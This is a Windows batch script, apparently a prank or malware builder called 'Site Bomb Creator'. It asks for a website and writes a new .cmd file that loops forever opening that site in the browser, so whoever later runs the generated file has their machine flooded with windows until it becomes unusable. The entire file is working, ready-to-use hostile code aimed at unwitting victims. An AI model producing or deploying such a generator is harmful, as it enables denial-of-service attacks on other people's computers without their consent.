@ECHO OFF
set RAND=%Random%
cd /d %~dp0
mode 110,10
color A
title Site Bomb Creator By Memer
echo Enter The Site Which Will Be Bombed When Someone Runs The Program [example.com\example]
echo The "&" Character Is Not Allowed
set /P SITE="> "
cls
echo @ECHO OFF>(%RAND%).cmd
echo :LOOP>>(%RAND%).cmd
echo start https://%SITE%>>(%RAND%).cmd
echo goto LOOP>>(%RAND%).cmd
IF %ERRORLEVEL% NEQ 0 goto INVALID
echo Saved As (%RAND%).cmd
pause
exit
:INVALID
cls
echo Invalid Site
pause
